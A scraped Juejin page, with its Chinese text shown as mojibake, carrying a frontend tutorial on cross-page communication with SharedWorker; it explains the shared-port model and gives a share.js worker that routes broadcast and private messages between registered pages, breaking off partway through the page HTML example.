content="https://p1-jj.byteimg.com/tos-cn-i-t2oaga2asx/gold-assets/icon/icon-128.png~tplv-t2oaga2asx-image.image"/> <div itemprop="author" itemscope="itemscope" itemtype="http://schema.org/Person"><meta itemprop="name" content="ä¸€è¯ºæ»šé›ªçƒ"/> <meta itemprop="url" content="https://juejin.cn/user/2824015112318094"/></div> <div itemprop="publisher" itemscope="itemscope" itemtype="http://schema.org/Organization"><meta itemprop="name" content="æ˜é‡‘"/> <div itemprop="logo" itemscope="itemscope" itemtype="https://schema.org/ImageObject"><meta itemprop="url" content="https://p1-jj.byteimg.com/tos-cn-i-t2oaga2asx/gold-assets/icon/icon-white-180.png~tplv-t2oaga2asx-image.image"/> <meta itemprop="width" content="180"/> <meta itemprop="height" content="180"/></div></div> <h1 class="article-title" data-v-61fb5e44="">
            å‰ç«¯è·¨é¡µé¢é€šè®¯ç»ˆææŒ‡å—â‘¥ï¼šSharedWorker ç”¨æ³•å…¨è§£æ
            <!----> <!----></h1> <div class="author-info-block block-hidden" data-v-61fb5e44=""><div class="author-info-box" data-v-61fb5e44=""><div class="author-name" data-v-61fb5e44=""><a href="/user/2824015112318094/posts" target="_blank" rel="" class="jj-link username username ellipsis" data-v-65b50b51="" data-v-292f6e48="" data-v-61fb5e44=""><span class="name" style="max-width:160px;" data-v-65b50b51="" data-v-292f6e48="">
    ä¸€è¯ºæ»šé›ªçƒ
  </span> <!----> <!----> <!----> </a></div> <div class="meta-box" data-v-61fb5e44=""><time datetime="2025-12-14T19:52:22.000Z" title="Sun Dec 14 2025 19:52:22 GMT+0000 (Coordinated Universal Time)" class="time" data-v-61fb5e44="">
                    2025-12-14
                  </time> <svg width="16" height="16" viewbox="0 0 16 16" fill="none" xmlns="http://www.w3.org/2000/svg" class="read-icon" data-v-61fb5e44=""><path d="M7.90078 2.80078C4.49278 2.80078 1.74745 6.11672 0.800781 7.77469C1.74745 9.58339 4.49278 13.2008 7.90078 13.2008C11.3088 13.2008 14.0541 9.58339 15.0008 7.77469C14.0541 6.11672 11.3088 2.80078 7.90078 2.80078Z" stroke="currentColor" data-v-61fb5e44=""/><circle cx="7.89922" cy="8.00078" r="2.2" stroke="currentColor" data-v-61fb5e44=""/></svg> <span class="views-count" data-v-61fb5e44="">
                    0
                  </span> <span class="read-time" data-v-61fb5e44=""><svg width="16" height="16" viewbox="0 0 16 16" fill="none" xmlns="http://www.w3.org/2000/svg" data-v-61fb5e44=""><rect width="16" height="16" fill="none" data-v-61fb5e44=""/><circle cx="8" cy="8" r="5.65625" stroke="#8A919F" data-v-61fb5e44=""/><path d="M7.69141 5.18652V8.30924H10.8141" stroke="#8A919F" stroke-linecap="round" stroke-linejoin="round" data-v-61fb5e44=""/></svg>
                    é˜…è¯»6åˆ†é’Ÿ
                  </span> <!----></div></div> <div style="flex:1;" data-v-61fb5e44=""/> <!----> <!----></div> <!----> <!----> <!----> <!----> <div id="article-root" itemprop="articleBody" class="main" data-v-61fb5e44=""><div class="article-viewer markdown-body result"><style>.markdown-body{word-break:break-word;line-height:1.75;font-weight:400;font-size:16px;overflow-x:hidden;color:#252933}.markdown-body h1,.markdown-body h2,.markdown-body h3,.markdown-body h4,.markdown-body h5,.markdown-body h6{line-height:1.5;margin-top:35px;margin-bottom:10px;padding-bottom:5px}.markdown-body h1{font-size:24px;line-height:38px;margin-bottom:5px}.markdown-body h2{font-size:22px;line-height:34px;padding-bottom:12px;border-bottom:1px solid #ececec}.markdown-body h3{font-size:20px;line-height:28px}.markdown-body h4{font-size:18px;line-height:26px}.markdown-body h5{font-size:17px;line-height:24px}.markdown-body h6{font-size:16px;line-height:24px}.markdown-body p{line-height:inherit;margin-top:22px;margin-bottom:22px}.markdown-body img{max-width:100%}.markdown-body hr{border:none;border-top:1px solid #ddd;margin-top:32px;margin-bottom:32px}.markdown-body code{word-break:break-word;border-radius:2px;overflow-x:auto;background-color:#fff5f5;color:#ff502c;font-size:.87em;padding:.065em .4em}.markdown-body code,.markdown-body pre{font-family:Menlo,Monaco,Consolas,Courier New,monospace}.markdown-body pre{overflow:auto;position:relative;line-height:1.75}.markdown-body pre&gt;code{font-size:12px;padding:15px 12px;margin:0;word-break:normal;display:block;overflow-x:auto;color:#333;background:#f8f8f8}.markdown-body a{text-decoration:none;color:#0269c8;border-bottom:1px solid #d1e9ff}.markdown-body a:active,.markdown-body a:hover{color:#275b8c}.markdown-body table{display:inline-block!important;font-size:12px;width:auto;max-width:100%;overflow:auto;border:1px solid #f6f6f6}.markdown-body thead{background:#f6f6f6;color:#000;text-align:left}.markdown-body tr:nth-child(2n){background-color:#fcfcfc}.markdown-body td,.markdown-body th{padding:12px 7px;line-height:24px}.markdown-body td{min-width:120px}.markdown-body blockquote{color:#666;padding:1px 23px;margin:22px 0;border-left:4px solid #cbcbcb;background-color:#f8f8f8}.markdown-body blockquote:after{display:block;content:""}.markdown-body blockquote&gt;p{margin:10px 0}.markdown-body ol,.markdown-body ul{padding-left:28px}.markdown-body ol li,.markdown-body ul li{margin-bottom:0;list-style:inherit}.markdown-body ol li .task-list-item,.markdown-body ul li .task-list-item{list-style:none}.markdown-body ol li .task-list-item ol,.markdown-body ol li .task-list-item ul,.markdown-body ul li .task-list-item ol,.markdown-body ul li .task-list-item ul{margin-top:0}.markdown-body ol ol,.markdown-body ol ul,.markdown-body ul ol,.markdown-body ul ul{margin-top:3px}.markdown-body ol li{padding-left:6px}.markdown-body .contains-task-list{padding-left:0}.markdown-body .task-list-item{list-style:none}@media (max-width:720px){.markdown-body h1{font-size:24px}.markdown-body h2{font-size:20px}.markdown-body h3{font-size:18px}}</style><style data-highlight="" data-highlight-key="juejin">.markdown-body pre,.markdown-body pre&gt;code.hljs{color:#333;background:#f8f8f8}.hljs-comment,.hljs-quote{color:#998;font-style:italic}.hljs-keyword,.hljs-selector-tag,.hljs-subst{color:#333;font-weight:700}.hljs-literal,.hljs-number,.hljs-tag .hljs-attr,.hljs-template-variable,.hljs-variable{color:teal}.hljs-doctag,.hljs-string{color:#d14}.hljs-section,.hljs-selector-id,.hljs-title{color:#900;font-weight:700}.hljs-subst{font-weight:400}.hljs-class .hljs-title,.hljs-type{color:#458;font-weight:700}.hljs-attribute,.hljs-name,.hljs-tag{color:navy;font-weight:400}.hljs-link,.hljs-regexp{color:#009926}.hljs-bullet,.hljs-symbol{color:#990073}.hljs-built_in,.hljs-builtin-name{color:#0086b3}.hljs-meta{color:#999;font-weight:700}.hljs-deletion{background:#fdd}.hljs-addition{background:#dfd}.hljs-emphasis{font-style:italic}.hljs-strong{font-weight:700}</style><h2 data-id="heading-0">å‰è¨€</h2>
<p>å‰é¢çš„æ–‡ç« å·²ç»ä»‹ç»äº†<code>postMessage</code>ã€<code>localStorage</code>ã€<code>messageChannel</code>ã€<code>broadcastChannel</code>ä»¥åŠ<code>window.name</code>ã€‚ä»Šå¤©è¦ä»‹ç»ä¸€ç§â€œå¤šé¡µé¢ååŒâ€åœºæ™¯çš„å·¥å…·â€”â€”<strong>SharedWorker</strong>ã€‚</p>
<p>ä¸åŒäºæ™®é€šWorkeråªèƒ½è¢«å•ä¸ªé¡µé¢ç‹¬å ï¼ŒSharedWorkerèƒ½è¢«<strong>åŒä¸€åŸŸåä¸‹çš„å¤šä¸ªé¡µé¢å…±äº«</strong>ï¼Œå®ç°é«˜æ•ˆçš„â€œå¤šé¡µé¢æ•°æ®ä¸­æ¢â€ã€‚æœ¬æ–‡å°±å¸¦ä½ äº†è§£<strong>SharedWorker</strong>è·¨é¡µé¢é€šè®¯çš„æ ¸å¿ƒç”¨æ³•ã€‚</p>
<h2 data-id="heading-1">1. ä»€ä¹ˆæ˜¯SharedWorkerï¼Ÿ</h2>
<p>åœ¨ä»‹ç»SharedWorkerä¹‹å‰ï¼Œæˆ‘ä»¬å…ˆå›é¡¾ä¸‹Workerçš„åŸºæœ¬æ¦‚å¿µï¼šWorkeræ˜¯HTML5å¼•å…¥çš„åå°çº¿ç¨‹æœºåˆ¶ï¼Œèƒ½è®©JavaScriptåœ¨ä¸»çº¿ç¨‹ä¹‹å¤–è¿è¡Œï¼Œé¿å…å¤æ‚è®¡ç®—é˜»å¡é¡µé¢æ¸²æŸ“ã€‚è€ŒSharedWorkerï¼Œé¡¾åæ€ä¹‰ï¼Œæ˜¯â€œå¯å…±äº«çš„Workerâ€ï¼Œå®ƒæœ‰ä¸¤ä¸ªæ ¸å¿ƒç‰¹ç‚¹ï¼š</p>
<ul>
<li><strong>è·¨é¡µé¢å…±äº«</strong>ï¼šåŒä¸€åŸŸåä¸‹çš„å¤šä¸ªæ ‡ç­¾é¡µã€iframeï¼Œç”šè‡³ä¸åŒçª—å£ï¼Œéƒ½èƒ½è¿æ¥åˆ°åŒä¸€ä¸ªSharedWorkerå®ä¾‹ï¼Œå®ç°æ•°æ®äº’é€šã€‚</li>
<li><strong>ç‹¬ç«‹çº¿ç¨‹</strong>ï¼šè¿è¡Œåœ¨ç‹¬ç«‹äºæ‰€æœ‰é¡µé¢ä¸»çº¿ç¨‹çš„åå°çº¿ç¨‹ä¸­ï¼Œæ—¢ä¸ä¼šé˜»å¡é¡µé¢ï¼Œä¹Ÿèƒ½ç»Ÿä¸€å¤„ç†å¤šé¡µé¢çš„è¯·æ±‚ã€‚</li>
<li><strong>åŸŸåéš”ç¦»</strong>ï¼šéµå¾ªåŒæºç­–ç•¥ï¼Œåªæœ‰ç›¸åŒåè®®ã€åŸŸåã€ç«¯å£çš„é¡µé¢ï¼Œæ‰èƒ½å…±äº«åŒä¸€ä¸ªSharedWorkerã€‚</li>
</ul>
<p>ç®€å•æ¥è¯´ï¼ŒSharedWorkerå°±åƒä¸€ä¸ªâ€œå…¬å…±æœåŠ¡ç«¯â€ï¼Œå¤šä¸ªé¡µé¢ä½œä¸ºâ€œå®¢æˆ·ç«¯â€ä¸ä¹‹å»ºç«‹è¿æ¥ï¼Œé€šè¿‡å®ƒå®Œæˆæ•°æ®çš„ä¼ é€’ä¸ååŒã€‚å’Œæ™®é€šWorkerçš„â€œä¸€å¯¹ä¸€â€æ¨¡å¼ä¸åŒï¼Œå®ƒæ˜¯â€œä¸€å¯¹å¤šâ€çš„é€šè®¯æ–¹æ¡ˆã€‚</p>
<h2 data-id="heading-2">2. SharedWorkerå¦‚ä½•å®ç°è·¨é¡µé¢é€šè®¯ï¼Ÿ</h2>
<p>SharedWorkerçš„é€šè®¯åŸç†å¯ä»¥æ¦‚æ‹¬ä¸ºâ€œ<strong>å•ä¸€å®ä¾‹+å¤šç«¯å£è¿æ¥</strong>â€ï¼Œå…ˆçœ‹ä¸€å¼ å›¾ï¼š</p>
<p><img src="https://p6-xtjj-sign.byteimg.com/tos-cn-i-73owjymdk6/de5bdd1f7e0e489583b6c564474e5108~tplv-73owjymdk6-jj-mark-v1:0:0:0:0:5o6Y6YeR5oqA5pyv56S-5Yy6IEAg5LiA6K-65rua6Zuq55CD:q75.awebp?rk3s=f64ab15b&amp;x-expires=1766346742&amp;x-signature=IoaS0x0QCyt2r4a0Icakl8QznFo%3D" alt="image.png" loading="lazy"/></p>
<p>å…·ä½“æµç¨‹æ˜¯ï¼š</p>
<ol>
<li><strong>åˆ›å»ºå®ä¾‹</strong>ï¼šæ¯ä¸ªé¡µé¢é€šè¿‡<code>new SharedWorker('./share.js')</code>åˆ›å»ºå®ä¾‹æ—¶ï¼Œæµè§ˆå™¨ä¼šå¯åŠ¨ä¸€ä¸ªSharedWorkeråå°çº¿ç¨‹ï¼ŒåŠ è½½æŒ‡å®šçš„è„šæœ¬æ–‡ä»¶,è¿™ä¸ªè„šæœ¬æ–‡ä»¶æ˜¯å…±äº«ã€‚</li>
<li><strong>ç«¯å£å»ºç«‹</strong>ï¼šæ¯ä¸ªé¡µé¢è¿æ¥åˆ°SharedWorkeråï¼Œéƒ½ä¼šä¸Workerå»ºç«‹ä¸€ä¸ªç‹¬ç«‹çš„â€œæ¶ˆæ¯ç«¯å£â€ï¼ˆMessagePortï¼‰ï¼Œè¿™æ˜¯é¡µé¢ä¸Workerä¹‹é—´çš„é€šè®¯é€šé“ã€‚</li>
<li><strong>æ•°æ®ä¼ é€’</strong>ï¼šé¡µé¢å’ŒWorkeréƒ½æ˜¯é€šè¿‡é€šè¿‡ç«¯å£å‘é€æ¶ˆæ¯<code>port.postMessage</code>ï¼Œéƒ½æ˜¯é€šè¿‡<code>port.onmessage</code>æ¥æ”¶æ•°æ®è¿›è¡Œå¤„ç†ï¼Œå†é€šè¿‡ç«¯å£å°†ç»“æœåé¦ˆç»™å•ä¸ªé¡µé¢ï¼Œæˆ–å¹¿æ’­ç»™æ‰€æœ‰è¿æ¥çš„é¡µé¢ã€‚</li>
<li><strong>å®ä¾‹é”€æ¯</strong>ï¼šå½“æ‰€æœ‰è¿æ¥åˆ°SharedWorkerçš„é¡µé¢éƒ½å…³é—­æ—¶ï¼ŒWorkeråå°çº¿ç¨‹æ‰ä¼šè¢«æµè§ˆå™¨é”€æ¯ï¼Œé‡Šæ”¾èµ„æºã€‚</li>
</ol>
<p>è¯´äº†è¿™ä¹ˆå¤š,æ¥ä¸‹æ¥æˆ‘ä»¬è¿›è¡Œå®è·µæ“ä½œã€‚</p>
<h2 data-id="heading-3">3. å®è·µæ¡ˆä¾‹</h2>
<p>SharedWorkerçš„ä½¿ç”¨åˆ†ä¸ºâ€œWorkerè„šæœ¬â€å’Œâ€œé¡µé¢è„šæœ¬â€ä¸¤éƒ¨åˆ†ï¼ŒWorkerè„šæœ¬è´Ÿè´£æ ¸å¿ƒé€»è¾‘ï¼Œé¡µé¢è„šæœ¬è´Ÿè´£å»ºç«‹è¿æ¥å’Œæ”¶å‘æ¶ˆæ¯ã€‚</p>
<p>å®ç°éœ€æ±‚ï¼šåŒä¸€åŸŸåä¸‹çš„pageAå’ŒpageBé¡µé¢ï¼Œé€šè¿‡SharedWorkerå®ç°æ¶ˆæ¯äº’å‘ï¼Œä¸”ä»»æ„é¡µé¢å¯ä»¥é€šè¿‡Workerå¹¿æ’­æ¶ˆæ¯ç»™æ‰€æœ‰é¡µé¢ã€‚</p>
<p>å¯ä»¥å…ˆçœ‹ä¸€å¼ é¡µé¢å¦‚ä½•è¿æ¥åˆ°Workeræµç¨‹å›¾ï¼š</p>
<p><img src="https://p6-xtjj-sign.byteimg.com/tos-cn-i-73owjymdk6/c87f6c4b75dc4e1f8b9d2b93d6c3bf81~tplv-73owjymdk6-jj-mark-v1:0:0:0:0:5o6Y6YeR5oqA5pyv56S-5Yy6IEAg5LiA6K-65rua6Zuq55CD:q75.awebp?rk3s=f64ab15b&amp;x-expires=1766346742&amp;x-signature=2gdOw5PK2ryQkADfhfM2X1rmgH8%3D" alt="image.png" loading="lazy"/></p>
<p>é¡µé¢ç«¯æˆ‘ä»¬åªéœ€è¦æ¥æ”¶å‘é€æ¶ˆæ¯å³å¯ï¼ŒWorkerç«¯æˆ‘ä»¬éœ€è¦æ”¶é›†æ³¨å†Œçš„ç«¯å£å¹¶è¿›è¡Œé€»è¾‘å¤„ç†ï¼Œä¸‹é¢æˆ‘ä»¬ä¸€æ­¥æ­¥æ¥å®ç°ï¼š</p>
<h3 data-id="heading-4">3.1 æ­¥éª¤1ï¼šç¼–å†™SharedWorkeræ ¸å¿ƒè„šæœ¬ï¼ˆshare.jsï¼‰</h3>
<p>share.jsçš„æ ¸å¿ƒé€»è¾‘ï¼šæ˜¯ä½¿ç”¨Mapç»“æ„ï¼Œé€šè¿‡<code>connect</code>å°†æ‰€æœ‰è¿æ¥Workerçš„é¡µé¢è¿›è¡Œæ”¶é›†ç«¯å£ï¼Œæ¯ä¸ªé¡µé¢éœ€è¦å”¯ä¸€çš„pageIdç”¨äºåç»­ç§å‘æ¶ˆæ¯ã€‚</p>
<p>é¡µé¢å‘é€æ•°æ®åˆ†ä¸ºä¸‰ç§ï¼Œè¿›å…¥é¡µé¢éœ€è¦æ³¨å†Œåˆ°share.jsï¼Œå‘é€å¹¿æ’­æ¶ˆæ¯ï¼Œå‘é€ç§ä¿¡éœ€è¦targeté¡µé¢çš„pageIdã€‚ æ•°æ®å¦‚ä¸‹ï¼š</p>

























<table><thead><tr><th>ç±»å‹</th><th>ç”¨é€”</th><th>å‚æ•°</th></tr></thead><tbody><tr><td><code>register</code></td><td>é¡µé¢æ³¨å†Œ</td><td><code>pageId</code></td></tr><tr><td><code>broadcast</code></td><td>å¹¿æ’­æ¶ˆæ¯</td><td><code>pageId</code>, <code>data</code></td></tr><tr><td><code>private</code></td><td>ç‚¹å¯¹ç‚¹æ¶ˆæ¯</td><td><code>pageId</code>, <code>target</code>, <code>data</code></td></tr></tbody></table>
<pre><code class="hljs language-js" lang="js"><span class="hljs-comment">// æ³¨å†Œé¡µé¢</span>
port.<span class="hljs-title function_">postMessage</span>({                                              
    <span class="hljs-attr">type</span>: <span class="hljs-string">'register'</span>,                                           
    <span class="hljs-attr">pageId</span>: <span class="hljs-string">'page-123'</span>                                          
});                                                            
<span class="hljs-comment">// å‘é€å¹¿æ’­                                                                     </span>
port.<span class="hljs-title function_">postMessage</span>({                               
   <span class="hljs-attr">type</span>: <span class="hljs-string">'broadcast'</span>,                                          
   <span class="hljs-attr">pageId</span>: <span class="hljs-string">'page-123'</span>,                                         
   <span class="hljs-attr">data</span>: <span class="hljs-string">'Hello everyone!'</span>                                     
});                                                             
<span class="hljs-comment">// å‘é€ç§ä¿¡                                                                     </span>
port.<span class="hljs-title function_">postMessage</span>({                               
   <span class="hljs-attr">type</span>: <span class="hljs-string">'private'</span>,                                            
   <span class="hljs-attr">pageId</span>: <span class="hljs-string">'page-123'</span>,                                         
   <span class="hljs-attr">target</span>: <span class="hljs-string">'page-456'</span>,                                         
   <span class="hljs-attr">data</span>: <span class="hljs-string">'Hi page-456!'</span>                                        
}); 
</code></pre>
<p>share.jsè„šæœ¬ï¼š</p>
<pre><code class="hljs language-js" lang="js"><span class="hljs-comment">// å­˜å‚¨æ‰€æœ‰é¡µé¢ä¸Workerçš„è¿æ¥ç«¯å£ï¼ˆä½¿ç”¨ Mapï¼Œkey æ˜¯ pageIdï¼Œvalue æ˜¯ portï¼‰</span>
<span class="hljs-keyword">const</span> connections = <span class="hljs-keyword">new</span> <span class="hljs-title class_">Map</span>();

<span class="hljs-variable language_">console</span>.<span class="hljs-title function_">log</span>(<span class="hljs-string">'æ‰“å°***self'</span>, self)
<span class="hljs-comment">// ç›‘å¬æ–°é¡µé¢çš„è¿æ¥è¯·æ±‚</span>
self.<span class="hljs-title function_">addEventListener</span>(<span class="hljs-string">'connect'</span>, <span class="hljs-function">(<span class="hljs-params">e</span>) =&gt;</span> {
    <span class="hljs-comment">// è·å–å½“å‰é¡µé¢çš„é€šè®¯ç«¯å£</span>
    <span class="hljs-keyword">const</span> port = e.<span class="hljs-property">ports</span>[<span class="hljs-number">0</span>];

    <span class="hljs-comment">// æ³¨æ„ï¼šæ­¤æ—¶è¿˜ä¸çŸ¥é“ pageIdï¼Œéœ€è¦ç­‰å¾… register æ¶ˆæ¯</span>
    <span class="hljs-variable language_">console</span>.<span class="hljs-title function_">log</span>(<span class="hljs-string">`æ–°é¡µé¢å°è¯•è¿æ¥ï¼Œç­‰å¾…æ³¨å†Œ...`</span>);

    <span class="hljs-comment">// å…è®¸ç«¯å£é€šè®¯</span>
    port.<span class="hljs-title function_">start</span>();

    <span class="hljs-comment">// å‘é¡µé¢å‘é€è¿æ¥æˆåŠŸæ¶ˆæ¯ï¼ˆç”¨äºè°ƒè¯•ï¼‰</span>
    port.<span class="hljs-title function_">postMessage</span>({
        <span class="hljs-attr">from</span>: <span class="hljs-string">'Worker'</span>,
        <span class="hljs-attr">type</span>: <span class="hljs-string">'connected'</span>,
        <span class="hljs-attr">data</span>: <span class="hljs-string">`Worker å·²è¿æ¥ï¼Œå½“å‰è¿æ¥æ•°ï¼š<span class="hljs-subst">${connections.size}</span>`</span>
    });

    <span class="hljs-comment">// ç›‘å¬ç«¯å£çš„æ¶ˆæ¯äº‹ä»¶ï¼ˆæ¥æ”¶é¡µé¢å‘æ¥çš„æ¶ˆæ¯ï¼‰</span>
    port.<span class="hljs-property">onmessage</span> = <span class="hljs-function">(<span class="hljs-params">msg</span>) =&gt;</span> {
        <span class="hljs-variable language_">console</span>.<span class="hljs-title function_">log</span>(<span class="hljs-string">'Workeræ”¶åˆ°æ¶ˆæ¯:'</span>, msg.<span class="hljs-property">data</span>);
        <span class="hljs-keyword">const</span> { type, target, data, pageId } = msg.<span class="hljs-property">data</span>;

        <span class="hljs-comment">// 0. å¤„ç†æ³¨å†Œæ¶ˆæ¯ï¼ˆé¡µé¢è¿æ¥æ—¶ç«‹å³å‘é€ï¼‰</span>
        <span class="hljs-keyword">if</span> (type === <span class="hljs-string">'register'</span>) {
            <span class="hljs-comment">// å¦‚æœè¯¥ pageId å·²å­˜åœ¨ï¼Œè¯´æ˜æ˜¯é¡µé¢åˆ·æ–°ï¼Œå…ˆå…³é—­æ—§è¿æ¥</span>
            <span class="hljs-keyword">if</span> (connections.<span class="hljs-title function_">has</span>(pageId)) {
                <span class="hljs-keyword">const</span> oldPort = connections.<span class="hljs-title function_">get</span>(pageId);
                <span class="hljs-variable language_">console</span>.<span class="hljs-title function_">log</span>(<span class="hljs-string">`é¡µé¢ <span class="hljs-subst">${pageId}</span> åˆ·æ–°ï¼Œæ¸…ç†æ—§è¿æ¥`</span>);
                <span class="hljs-keyword">try</span> {
                    oldPort.<span class="hljs-title function_">close</span>();
                } <span class="hljs-keyword">catch</span> (e) {
                    <span class="hljs-comment">// å¿½ç•¥å…³é—­é”™è¯¯</span>
                }
            }

            <span class="hljs-comment">// ä¿å­˜æ–°è¿æ¥</span>
            port.<span class="hljs-property">pageId</span> = pageId;
            connections.<span class="hljs-title function_">set</span>(pageId, port);
            <span class="hljs-variable language_">console</span>.<span class="hljs-title function_">log</span>(<span class="hljs-string">`é¡µé¢ <span class="hljs-subst">${pageId}</span> å·²æ³¨å†Œï¼Œå½“å‰åœ¨çº¿ï¼š[<span class="hljs-subst">${<span class="hljs-built_in">Array</span>.<span class="hljs-keyword">from</span>(connections.keys()).join(<span class="hljs-string">', '</span>)}</span>]`</span>,connections);
            <span class="hljs-keyword">return</span>;
        }

        <span class="hljs-comment">// ä¿å­˜é¡µé¢æ ‡è¯†åˆ°ç«¯å£å¯¹è±¡ï¼ˆå…¼å®¹æ—§çš„å‘é€æ–¹å¼ï¼‰</span>
        <span class="hljs-keyword">if</span> (pageId &amp;&amp; !port.<span class="hljs-property">pageId</span>) {
            port.<span class="hljs-property">pageId</span> = pageId;
            connections.<span class="hljs-title function_">set</span>(pageId, port);
            <span class="hljs-variable language_">console</span>.<span class="hljs-title function_">log</span>(<span class="hljs-string">`é¡µé¢ <span class="hljs-subst">${pageId}</span> å·²æ³¨å†Œï¼ˆå…¼å®¹æ¨¡å¼ï¼‰`</span>);
        }

        <span class="hljs-comment">// 1. å¹¿æ’­æ¶ˆæ¯ï¼šå‘é€ç»™æ‰€æœ‰è¿æ¥çš„é¡µé¢</span>
        <span class="hljs-keyword">if</span> (type === <span class="hljs-string">'broadcast'</span>) {
            <span class="hljs-variable language_">console</span>.<span class="hljs-title function_">log</span>(<span class="hljs-string">`å¹¿æ’­æ¶ˆæ¯ç»™ <span class="hljs-subst">${connections.size}</span> ä¸ªè¿æ¥`</span>);
            connections.<span class="hljs-title function_">forEach</span>(<span class="hljs-function">(<span class="hljs-params">conn, id</span>) =&gt;</span> {
                <span class="hljs-keyword">try</span> {
                    conn.<span class="hljs-title function_">postMessage</span>({ <span class="hljs-attr">from</span>: <span class="hljs-string">'Worker'</span>, <span class="hljs-attr">data</span>: <span class="hljs-string">`å¹¿æ’­æ¶ˆæ¯ï¼š<span class="hljs-subst">${data}</span>`</span> });
                } <span class="hljs-keyword">catch</span> (e) {
                    <span class="hljs-variable language_">console</span>.<span class="hljs-title function_">log</span>(<span class="hljs-string">`å‘é€ç»™ <span class="hljs-subst">${id}</span> å¤±è´¥ï¼Œç§»é™¤è¿æ¥`</span>);
                    connections.<span class="hljs-title function_">delete</span>(id);
                }
            });
        }
        <span class="hljs-comment">// 2. ç‚¹å¯¹ç‚¹æ¶ˆæ¯ï¼šä»…å‘é€ç»™ç›®æ ‡é¡µé¢ï¼ˆè¿™é‡Œç”¨é¡µé¢æ ‡è¯†åŒºåˆ†ï¼‰</span>
        <span class="hljs-keyword">else</span> <span class="hljs-keyword">if</span> (type === <span class="hljs-string">'private'</span>) {
            <span class="hljs-variable language_">console</span>.<span class="hljs-title function_">log</span>(<span class="hljs-string">`ç§å‘æ¶ˆæ¯ç»™ <span class="hljs-subst">${target}</span>ï¼Œå½“å‰è¿æ¥ï¼š[<span class="hljs-subst">${<span class="hljs-built_in">Array</span>.<span class="hljs-keyword">from</span>(connections.keys()).join(<span class="hljs-string">', '</span>)}</span>]`</span>);

            <span class="hljs-keyword">if</span> (connections.<span class="hljs-title function_">has</span>(target)) {
                <span class="hljs-keyword">try</span> {
                    connections.<span class="hljs-title function_">get</span>(target).<span class="hljs-title function_">postMessage</span>({ <span class="hljs-attr">from</span>: <span class="hljs-string">'Worker'</span>, <span class="hljs-attr">data</span>: <span class="hljs-string">`ç§å‘æ¶ˆæ¯ï¼š<span class="hljs-subst">${data}</span>`</span> });
                } <span class="hljs-keyword">catch</span> (e) {
                    <span class="hljs-variable language_">console</span>.<span class="hljs-title function_">log</span>(<span class="hljs-string">`å‘é€ç»™ <span class="hljs-subst">${target}</span> å¤±è´¥ï¼Œç§»é™¤è¿æ¥`</span>);
                    connections.<span class="hljs-title function_">delete</span>(target);
                }
            } <span class="hljs-keyword">else</span> {
                <span class="hljs-variable language_">console</span>.<span class="hljs-title function_">log</span>(<span class="hljs-string">`è­¦å‘Šï¼šæœªæ‰¾åˆ°ç›®æ ‡é¡µé¢ <span class="hljs-subst">${target}</span>`</span>);
            }
        }
    };

    <span class="hljs-comment">// ç›‘å¬ç«¯å£å…³é—­äº‹ä»¶ï¼ˆé¡µé¢å…³é—­æˆ–ä¸»åŠ¨æ–­å¼€ï¼‰</span>
    port.<span class="hljs-title function_">addEventListener</span>(<span class="hljs-string">'close'</span>, <span class="hljs-function">() =&gt;</span> {
        <span class="hljs-comment">// é€šè¿‡ pageId åˆ é™¤è¿æ¥</span>
        <span class="hljs-keyword">if</span> (port.<span class="hljs-property">pageId</span>) {
            connections.<span class="hljs-title function_">delete</span>(port.<span class="hljs-property">pageId</span>);
            <span class="hljs-variable language_">console</span>.<span class="hljs-title function_">log</span>(<span class="hljs-string">`é¡µé¢ <span class="hljs-subst">${port.pageId}</span> æ–­å¼€è¿æ¥ï¼Œå½“å‰åœ¨çº¿ï¼š[<span class="hljs-subst">${<span class="hljs-built_in">Array</span>.<span class="hljs-keyword">from</span>(connections.keys()).join(<span class="hljs-string">', '</span>)}</span>]`</span>);
        }
    });

    <span class="hljs-comment">// å…è®¸ç«¯å£é€šè®¯ï¼ˆå¿…é¡»è°ƒç”¨ï¼Œå¦åˆ™æ— æ³•æ”¶å‘æ¶ˆæ¯ï¼‰</span>
    port.<span class="hljs-title function_">start</span>();
});

</code></pre>
<h3 data-id="heading-5">3.2 æ­¥éª¤äºŒï¼šç¼–å†™é¡µé¢è„šæœ¬ï¼ˆpageA.html å’Œ pageB.htmlï¼‰</h3>
<p>ä»£ç é€»è¾‘å¦‚ä¸‹ï¼šå”¯ä¸€éœ€è¦åŒºåˆ«çš„æ˜¯<code>pageId</code>ï¼Œé¡µé¢Båªéœ€å°†<code>pageId</code>æ”¹ä¸º<code>page-456</code>ï¼Œå¹¶è°ƒæ•´â€œå‘ç»™é¡µé¢Bâ€æŒ‰é’®çš„é€»è¾‘ä¸ºâ€œå‘ç»™é¡µé¢Aâ€å³å¯ã€‚</p>
<p>é¡µé¢çš„åˆ›å»ºæµç¨‹å¦‚ä¸‹ï¼š</p>
<pre><code class="hljs language-js" lang="js"><span class="hljs-number">1.</span> é¡µé¢åˆ›å»º <span class="hljs-title class_">SharedWorker</span> å®ä¾‹
   â†“
<span class="hljs-number">2.</span> è°ƒç”¨ port.<span class="hljs-title function_">start</span>() å¯åŠ¨é€šä¿¡
   â†“
<span class="hljs-number">3.</span> æ³¨å†Œ onmessage ç›‘å¬å™¨
   â†“
<span class="hljs-number">4.</span> å‘é€ register æ¶ˆæ¯ï¼ˆæºå¸¦ pageIdï¼‰
   â†“
<span class="hljs-number">5.</span> <span class="hljs-title class_">Worker</span> ä¿å­˜è¿æ¥åˆ° <span class="hljs-title class_">Map</span>: connections.<span class="hljs-title function_">set</span>(pageId, port)
   â†“
<span class="hljs-number">6.</span> é¡µé¢å¯ä»¥å¼€å§‹å‘é€/æ¥æ”¶æ¶ˆæ¯
</code></pre>
<p>ä»£ç å¦‚ä¸‹ï¼š</p>
<pre><code class="hljs language-js" lang="js">&lt;body&gt;
    <span class="xml"><span class="hljs-tag">&lt;<span class="hljs-name">h3</span>&gt;</span>é¡µé¢Aï¼ˆæ ‡è¯†ï¼špage-123ï¼‰<span class="hljs-tag">&lt;/<span class="hljs-name">h3</span>&gt;</span></span>
    <span class="xml"><span class="hljs-tag">&lt;<span class="hljs-name">input</span> <span class="hljs-attr">type</span>=<span class="hljs-string">"text"</span> <span class="hljs-attr">id</span>=<span class="hljs-string">"msgInput"</span> <span class="hljs-attr">placeholder</span>=<span class="hljs-string">"è¾“å…¥æ¶ˆæ¯"</span>&gt;</span>
    <span class="hljs-tag">&lt;<span class="hljs-name">button</span> <span class="hljs-attr">onclick</span>=<span class="hljs-string">"sendBroadcast()"</span>&gt;</span>å¹¿æ’­æ¶ˆæ¯<span class="hljs-tag">&lt;/<span class="hljs-name">button</span>&gt;</span>
